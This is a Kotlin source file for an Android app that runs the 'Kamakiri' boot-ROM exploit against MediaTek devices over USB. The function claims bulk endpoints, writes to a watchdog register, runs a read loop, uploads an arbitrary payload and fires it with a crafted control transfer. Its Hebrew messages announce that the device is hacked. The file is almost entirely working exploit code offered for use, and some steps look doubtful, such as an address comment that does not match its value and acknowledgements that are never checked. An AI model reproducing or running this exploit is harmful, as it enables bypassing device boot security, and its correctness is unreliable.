package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.Locale

object MtkBromConnection {

    private fun toLittleEndian(value: Int): ByteArray {
        return ByteArray(4).apply {
            this[0] = (value and 0xFF).toByte()
            this[1] = ((value shr 8) and 0xFF).toByte()
            this[2] = ((value shr 16) and 0xFF).toByte()
            this[3] = ((value shr 24) and 0xFF).toByte()
        }
    }

    private fun toBigEndian(value: Int): ByteArray {
        return ByteArray(4).apply {
            this[0] = ((value shr 24) and 0xFF).toByte()
            this[1] = ((value shr 16) and 0xFF).toByte()
            this[2] = ((value shr 8) and 0xFF).toByte()
            this[3] = (value and 0xFF).toByte()
        }
    }

    fun runKamakiriExploit(
        usbManager: UsbManager,
        device: UsbDevice,
        payloadBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."

        var epIn: UsbEndpoint? = null
        var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val usbInterface = device.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }

        if (epIn == null || epOut == null) {
            connection.close()
            return "שגיאה: לא נמצאו נקודות קצה."
        }

        fun usbwrite(data: ByteArray) {
            connection.bulkTransfer(epOut, data, data.size, 2000)
        }

        fun usbread(len: Int): ByteArray {
            val buf = ByteArray(len)
            connection.bulkTransfer(epIn, buf, len, 2000)
            return buf
        }

        fun echo(data: ByteArray) {
            usbwrite(data)
            usbread(data.size)
        }

        fun write32(addr: Int, data: Int) {
            usbwrite(byteArrayOf(0xD4.toByte()))
            usbwrite(toLittleEndian(addr))
            usbwrite(toLittleEndian(data))
            usbread(4) // status
        }

        fun read32(addr: Int, dwords: Int) {
            usbwrite(byteArrayOf(0xD1.toByte()))
            usbwrite(toLittleEndian(addr))
            usbwrite(toLittleEndian(dwords))
            usbread(dwords * 4) // data
            usbread(4) // status
        }

        onProgress("Starting Kamakiri exploit...")
        
        val addr = 0x10007050 // watchdog (0x10007000) + 0x50
        val revdwordPayloadAddr = 0x000A1000 // revdword(0x100A00)
        
        // 1. write32
        onProgress("write32...")
        write32(addr, revdwordPayloadAddr)
        
        // 2. read32 loop
        onProgress("read32 loop...")
        for (i in 0 until 0xF) {
            val readAddr = addr - (0xF - i) * 4
            val readLen = 0xF - i + 1
            read32(readAddr, readLen)
        }
        
        // 3. echo b"\xE0"
        onProgress("echo 0xE0...")
        echo(byteArrayOf(0xE0.toByte()))
        
        // 4. echo len(payload) as Big Endian
        onProgress("send payload length...")
        val lenBytes = toBigEndian(payloadBytes.size)
        echo(lenBytes)
        
        // 5. check status (2 bytes)
        onProgress("check status...")
        usbread(2)
        
        // 6. send payload
        onProgress("Sending payload...")
        usbwrite(payloadBytes)
        
        // 7. read 2 bytes (ack?)
        onProgress("read ack...")
        usbread(2)
        usbread(2)
        
        // 8. ctrl_transfer
        onProgress("Triggering ctrl_transfer...")
        connection.controlTransfer(0xA1, 0, 0, 0x25, null, 0, 1000)
        
        connection.close()
        onProgress("Kamakiri exploit finished.")
        
        return "הצלחה! פריצת Kamakiri הורצה. המכשיר פרוץ!"
    }
}
